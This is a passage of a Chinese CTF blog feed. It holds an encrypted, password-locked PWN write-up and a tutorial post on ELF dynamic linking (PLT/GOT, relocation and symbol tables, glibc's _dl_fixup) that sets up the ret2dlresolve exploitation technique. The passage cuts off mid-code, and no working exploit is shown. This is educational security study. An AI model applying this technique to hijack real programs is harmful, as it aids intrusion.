88c3e43b1f0cb8965b84b35f0785eca883d1dd9fe6335a13054e34802ab03ca3b1c5ba83b62cd0d2f5ce387bfeaa8524049537567f0807e1c4f25374d77a37c7b65ea7476c82b2fde88536a576d11c920079f9ad7de378ff98e6b800a60047d4d32553e2de8bc99df83daa4007a003adc1f142fcf546e715a76acd38678f94df0364eff308de3da797f4e8aeea0f297912566f27c8d1fbf9d029210dc4afb2fae9d58542b8f3b98adeca56233b7234b67c8011ad542064a050219967e7537963164fbb48da37e264f600134130403ccffefa42710390a57fba1be1482f9241cc581f859a88fa64167d727dd7f2abeeccd0320723c295cb6b6b1f31d0375ad42d425954ef456379d3637802ddac934dfd59fb6330f615783bb310f15128d80b8697193ae76f940c97b9f15b8cb57db342c093ddd2eb319d59dd4cff85900b16fe793d7e595581de08bb73e970ed62db378514739e4787ede9323ece66697edb4bc1df10cd785f351d240716b0134a4aff0bb6a39d76ee6092b0e637c868fbaff010fd9a6ac581d3d599d41dbb1f3c4585a2561e97f33f05f279cc6e8f43086f5e54532be85fdd3d887fca0cc1064de0a70d119e98e8d8226aec4a5fb689c4e97feca296436601a10d3c2f1102a458fd2d303af8f461889de6e4fa3e225c5f11331f8ac2c5e0cfef2e7c0142a4a63fa7e3ddef9b23530757ad9111aa9c099904ded29afdf25a37507c11f9754fb7dbf0197822bd5a266deec03a9aca088a3709211058c875edd10991f71f2d118eaad420567c72d3843af999f429de0e0217e7c69071138871e4c024cce36e06b4d0300e97bd9a769384dd635f5b88b9a9f23dae2c9b2e40e02f8cf8e9a2975eb38e663263b7737b316b506b838b9b0d092213bfaacbc970f40a9b5f50b562db3e0fb15fddcbd1e45d15e89085a4ccbb2dc4ab918b0c4e29547b90cf836e45dc478d07b94551676e3909dd67c196fedeff1d1c0f10fb98ff39412bc46e2ac9acc0a67710bfe801e1524a2e970abd4ae648a66f4d9c6178ee8b4d44a1dfcf06be7c29661929c75d0ac9eb79f11ed329efa27d0b4a1938cf4049dc744776aba67acdfc91aa6ce3b84115b635b2e803d6bcb09f486df2c33401fbd5a5f2cd08357934c0cbb0313e69ec21af7d468db5bf46f6716c9bc8e4be6d1c168b46efbe316b97424a4c9dbd86c779db381228bdd40f315d73edd8d7e4c18e02d6bfefa983956814d8a91aea1ae6309642c0d138cb29b9b38ac730998e4d58cc21b922118ddd6b165b88a8b0069bcc34174c375df221a06eba2a0482206c929fc14e65a3cd919c1e8346be43ae7cf0e445b0393730a1556961bb9a0d6bca12df488622b279b495232d88af5a69c597486ff66ba2c61bdd23a1481a295ec7377a47f89367661e395c48f5037b41e0bd2d5fe71c92eac47d2e84dea8cad887534fe516c9447a80ff49c6a8f08787f1947e6106d94f615ad70d30d95b7d352f4d8734af034c94e6a32b49737dda5e3b47e7d8b92c01e5682b147eca93765091fe97b28db34be68007e91ca691e1fd3a689d2d574eb61d6576ae6078abcaf8317be04d4014ac71a8ecbef536e1e8c98c2ca8f1277c9acf6c34b16bd5dab10686ed953f7ebf62ec574fc9024e289359158053d6103abf8feadf990beacd9361dee90a1cfb2f52cdf3b3e61a2f278636642741ffcf05f5978eb3b9388676715c76b7da620518a7867ab901b5abf6cc666ea33913749392f418c57c61b3777621c92dbf34da2dbb096e518cf5dc1dcde1ce6455bed3b612fe3b20df16fec12b35a1a7f43f705bd6fbff16896f9f18b3d59a44999c5440a9087105295a62381ff0b81dc13bf6abdf4f6c9c7326bdf6ee90e397738f57c784f892727114e428cd4e3896430385792b10d6b566c661ea17d39e9b5c895feafdbb5197c1c8de42aafb77613646ce88e0d41d64cb694ca365c714735fe398fdf0425f8c11d2744d4eb022a00173cff3ae19373f0f49ca176928faf9bbb7e707797d0c223064631b03c2e9712d4d8e0139c3b7a7685c722bf9e8ed9b6430b277eb02ca51bb64740a07435960790bbd4470fed477271f691bab408bd41da5854ba9738bdf1fab9ff2884cd386c4f86f1515f96fa95ec5e166dfe3d9ac9abab1a4feba6f7062573f47c34782f7de93c25c8c3627b0c285962ee3c4187bd8004859fdaa38dff3f927486723bd67882ab7afb593c8a5e5fc87882bcc2466d9336f7967a9ed9519c292e23f3fce750ebc1c2cb2053f6cab4294e3d0610a9285784d7dd9c485eec866b0749d8d7e470c02e028997b25d73abc05034a1c4f58f80b19efaff44f4a6e9854c20d3c0bdfe77e6a61aadf5fa0e33f0804cc35a64b3ea99326fb3e925762aa0c59ec25056771f0da1b588000f5cc05927af225b99f06ee762d2447cebf236dfc02a1e495ac60961444fe4fc6a0aa1272f8c7b2f1225d6e84d30429d9fa996f289ff4457a080ca58265edbae82056c8fbf5bf3f99c2f61bf7469ac2d6059954754a7a0c641cf372eeeb600fb032c173bd76f484e905289222a509ecdf749cf73b86644c7a703c1359be0ac850381f9c6aa0f47638eaaa4af42c04abbca4b515f07e9aeab7c29a33ae27a5ff210877783dfb0cf94083e07ab977808de0adfc764e8962f7bef399d2b43e411cfd259d2ad6a5171b99df5e4d539c8f9d85ae93ae8bcbc0c354897a7142ab86f15653156563c5198c83a62d183424fd75efe8c09c72573dfd733deeea0cb52d1e3ebb5057c351b5f4912eac5e87a4ab280e7fcde74d73b5f57da1bcbf443a67111de6413a395e29d9e4ff40feba7a5afe9bcba5cae3c25c46beab866c8baa204ebcc5115824f51a985a83d0a9fd6e4e7fb9b0ee7cfb71a7ba9920425951249655731be485a7a8cffc942fe5fab9123120627b5cea08b1fba108eb58f8896070b2e09ac21b65fa828e589fc33cba65f8b92cd01fd565eae4b7012f4506d424e0c03cd2aab7e2c3a99d7839b70f1ee79c8a44fda8f41d4acdb3a0deef71a6c1530bbacf5f518b2e9fb1b700e470e055651a1745c2d30e1895763b42ad7594eea14bb80b51670ee2e68c342182e68fc546540cae0333c0f7af32e337251a3351243543da3433d42da594b229e28be46c2b9342e8afcedea04e679d7ced8ce55bbd6c026d6a24bab110ccdea04cc1679fd001aa2e51170e634cb48a48405b4dc3f9607dece346d393eb87f9dced9c1ea474a1a791874107aabdabfdc7dc3c37978629ffb2cf33e5b255d053aa929c02fef781571a916c08cc7724128a4da916031dadbc660eb2955e5e14ef202820d329920e895d79f037dbc4b9d878caf0d733a9691d6710758bedb40ae682c6291f014df47e6da18c877d49140766ee1bd8633d82a440cbd396a77d79e4378f362b3ca28603c5e9b34d02d13c6dc6745edc87a578ca33f66952e010f02c1d07f2b9319aa0b0f624b4730a3ac9d64d58ea6d495a70d4f8b4ad9c7dba9abde2d6a7875863d51bb42ea458842885453d38e4d42608b3bb6ea39deddd8755fdf9f13e877408d553662de9635b21f28e0bdddf90e085b2fb66a9a3ecff88f7c2fa7e56ffc2766ee1ff2d046ec36deed4d5e6a3cecf29fd348da17be7c9eeddcde58dc28f623913a40175e4e497ad512c234b7ddacae1a8b3b8fa6565fd1b51587a8696573608af46f3bf3520958c0d79d553237dbba15762afe669bca3dc95579c102dd42cd39bfbf86d813969c859fbef8dd89993e1bd477ef9db80a2f424a0efd62e40269c03f6e094a89475e8a5a936a9b1cedcc6868f803fec5b6062b4558773294cbce5084a5e784b1490927372a346d7e409c1cd9bb970ba74bb6b1b9e324</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">由于相关法律法规，该wp暂不开放</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dl相关攻击汇总</title>
      <link href="/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/"/>
      <url>/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><h2 id="机制"><a href="#机制" class="headerlink" title="机制"></a>机制</h2><p>使用动态链接时，程序按模块拆分为多个独立部分，在程序运行时才链接在一起。linux中ELF动态链接文件称为动态共享对象(DSO)，以<code>.so</code>为拓展名。常用的C语言运行库glibc保存为<code>libc.so</code>。</p><p>链接的操作由动态链接器ld完成。运行时动态链接器与普通共享对象一同被映射到进程的地址空间，程序在运行时首先运行ld，完成所有动态链接工作后再转交主程序。</p><p>如果程序中存在跨模块的数据访问，由于目标变量的地址要在装载时才能确定，需要使得程序中的代码地址无关。于是把跟地址相关的代码放在数据段里，即全局偏移表(Global Offset Table)。至于模块间的调用，跳转，也用GOT表实现，但是出于效率考虑，需要引入延迟绑定机制。</p><p>延迟绑定(Lazy Binding)的思想是在程序第一次用到时才绑定(符号查找，重定位)，使用PLT表(Procedure Linkage Table)实现，实现代码如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PLT0:</span><br><span class="line">push *(GOT + 4)</span><br><span class="line">jump *(GOT + 8)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">bar@plt:</span><br><span class="line">jmp *(bar@GOT)</span><br><span class="line">push n</span><br><span class="line">jump PLT0</span><br></pre></td></tr></table></figure><p>(此处的实现与之后的利用密切相关)</p><p>其中<code>bar@GOT</code>中初始保存<code>bar@plt</code>的下一条指令(原地tp)，随后push的n是bar在重定位表项中的序号。<code>GOT + 4</code> 中保存一个名为<code>link_map</code>的结构体的地址，它保存了本模块动态链接的相关信息，<code>GOT + 8</code>中保存<code>_dl_runtime_resolve()</code>的地址，该函数的作用便是解析<code>link_map</code>，计算出bar函数的真正地址，并将其填入<code>bar@GOT</code>中</p><h2 id="实现结构"><a href="#实现结构" class="headerlink" title="实现结构"></a>实现结构</h2><h3 id="interp段"><a href="#interp段" class="headerlink" title=".interp段"></a><code>.interp</code>段</h3><p>一个字符串，动态连接器的路径</p><h3 id="dynamic段"><a href="#dynamic段" class="headerlink" title=".dynamic段"></a><code>.dynamic</code>段</h3><p><code>readelf -d Lib.so</code>查看<br>保存了动态连接器所需的基本信息，结构如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   Elf32_Sword   d_tag;          <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">   <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">       Elf32_Word d_val;         <span class="comment">/* Integer value */</span></span><br><span class="line">       Elf32_Addr d_ptr;         <span class="comment">/* Address value */</span></span><br><span class="line">     &#125; d_un;</span><br><span class="line"> &#125; Elf32_Dyn;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Sxword d_tag; <span class="comment">/* Dynamic entry type */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">Elf64_Xword d_val; <span class="comment">/* Integer value */</span></span><br><span class="line">Elf64_Addr d_ptr; <span class="comment">/* Address value */</span></span><br><span class="line">  &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure><p>在<code>elf.h</code>中定义了不同d_tag的值与对应类型，后面比较常用的有</p><ul><li><code>DT_REL</code> 动态链接重定位表地址</li><li><code>DT_SYMTAB</code> 动态链接符号表地址</li><li><code>DT_STRTAB</code> 动态链接字符串表地址</li><li><code>DT_INIT</code> 初始化代码地址</li><li><code>DT_FINI</code> 结束代码地址</li></ul><h3 id="DT-REL动态链接重定位表"><a href="#DT-REL动态链接重定位表" class="headerlink" title="DT_REL动态链接重定位表"></a><code>DT_REL</code>动态链接重定位表</h3><p><code>readelf -r Lib.so</code>查看<br>共享对象的重定位在装载时完成，重定位表分为<code>.rel.dyn</code>和<code>.rel.plt</code>。前者修正数据引用，即<code>.got</code>和<code>.data</code>；后者修正<code>.got.plt</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf32_Addr r_offset; <span class="comment">/* Address */</span></span><br><span class="line">Elf32_Word r_info; <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Addr r_offset; <span class="comment">/* Address */</span></span><br><span class="line">Elf64_Xword r_info; <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_SYM(val) ((val) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_TYPE(val) ((val) &amp; 0xff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_INFO(sym, type) (((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_SYM(i) ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_TYPE(i) ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure><p><code>r_offset</code>表示需要修正的地址，<code>r_info</code>高位表示该符号在符号表中的序号，低位表示符号类型。</p><h3 id="DT-SYMTAB-动态链接符号表"><a href="#DT-SYMTAB-动态链接符号表" class="headerlink" title="DT_SYMTAB 动态链接符号表"></a><code>DT_SYMTAB</code> 动态链接符号表</h3><p><code>readelf -sD Lib.so</code>查看<br>通常保存在段<code>.dynsym</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf32_Word st_name; <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">Elf32_Addr st_value; <span class="comment">/* Symbol value */</span></span><br><span class="line">Elf32_Word st_size; <span class="comment">/* Symbol size */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">/* Symbol type and binding */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_other; <span class="comment">/* Symbol visibility */</span></span><br><span class="line">Elf32_Section st_shndx; <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">Elf64_Word st_name; <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">/* Symbol type and binding */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> st_other; <span class="comment">/* Symbol visibility */</span></span><br><span class="line">Elf64_Section st_shndx; <span class="comment">/* Section index */</span></span><br><span class="line">Elf64_Addr st_value; <span class="comment">/* Symbol value */</span></span><br><span class="line">Elf64_Xword st_size; <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* How to extract and insert information held in the st_info field. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_BIND(val) (((unsigned char) (val)) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_TYPE(val) ((val) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_INFO(bind, type) (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_ST_BIND(val) ELF32_ST_BIND (val)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_ST_TYPE(val) ELF32_ST_TYPE (val)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_ST_INFO(bind, type) ELF32_ST_INFO ((bind), (type))</span></span><br></pre></td></tr></table></figure><h3 id="DT-STRTAB-动态链接字符串表"><a href="#DT-STRTAB-动态链接字符串表" class="headerlink" title="DT_STRTAB 动态链接字符串表"></a><code>DT_STRTAB</code> 动态链接字符串表</h3><p><code>.dynstr</code>中<br>存储字符串，无需赘述</p><h3 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a><code>link_map</code></h3><p>一个结构体，保存动态链接相关信息<br>代码太长不贴，有两个比较重要的部分</p><ul><li><code>l_addr</code> 程序的基址</li><li><code>l_info[]</code>一个数组，保存了多个重定位项的地址</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>调用<code>_dl_runtime_resolve</code>时，传参<code>link_map</code>和<code>rel_offset</code>，查找流程如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map, rel_offset)</span><br><span class="line">                                       +</span><br><span class="line">          +-----------+                |</span><br><span class="line">          | Elf32_Rel | &lt;--------------+</span><br><span class="line">          +-----------+</span><br><span class="line">     +--+ | r_offset  |        +-----------+</span><br><span class="line">     |    |  r_info   | +----&gt; | Elf32_Sym |</span><br><span class="line">     |    +-----------+        +-----------+      +----------+</span><br><span class="line">     |      .rel.plt           |  st_name  | +--&gt; | system\<span class="number">0</span> |</span><br><span class="line">     |                         |           |      +----------+</span><br><span class="line">     v                         +-----------+        .dynstr</span><br><span class="line">+----+-----+                      .dynsym</span><br><span class="line">| &lt;system&gt; |</span><br><span class="line">+----------+</span><br><span class="line">  .got.plt</span><br></pre></td></tr></table></figure><h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>调用<code>_dl_runtime_resolve</code>后，实际完成绑定工作的是其中调用的<code>_dl_fixup</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This function is called through a special trampoline from the PLT the</span></span><br><span class="line"><span class="comment">first time each PLT entry is called. We must perform the relocation</span></span><br><span class="line"><span class="comment">specified in the PLT of the given shared object, and return the resolved</span></span><br><span class="line"><span class="comment">function address to the trampoline, which will restart the original call</span></span><br><span class="line"><span class="comment">to that address. Future calls will bounce directly from the PLT to the</span></span><br><span class="line"><span class="comment">function. */</span></span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line"> = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">uintptr_t</span> pltgot = (<span class="type">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line"> = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">+ reloc_offset (pltgot, reloc_arg));</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line"><span class="type">lookup_t</span> result;</span><br><span class="line">DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation. */</span></span><br><span class="line">assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look up the target symbol. If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">used don&#x27;t look in the global scope. */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">  (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line"><span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">version = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We need to keep the scope around so do some locking. This is</span></span><br><span class="line"><span class="comment">not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">we are not using any threads (yet). */</span></span><br><span class="line"><span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line"><span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">  &#123;</span><br><span class="line">THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We are done with the global scope. */</span></span><br><span class="line"><span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">  THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">of the object that defines sym. Now add in the symbol</span></span><br><span class="line"><span class="comment">offset. */</span></span><br><span class="line">value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>));</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line"><span class="comment">/* We already found the symbol. The module (and therefore its load</span></span><br><span class="line"><span class="comment">address) is also known. */</span></span><br><span class="line">value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="literal">true</span>));</span><br><span class="line">result = l;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* And now perhaps the relocation addend. */</span></span><br><span class="line">value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sym != <span 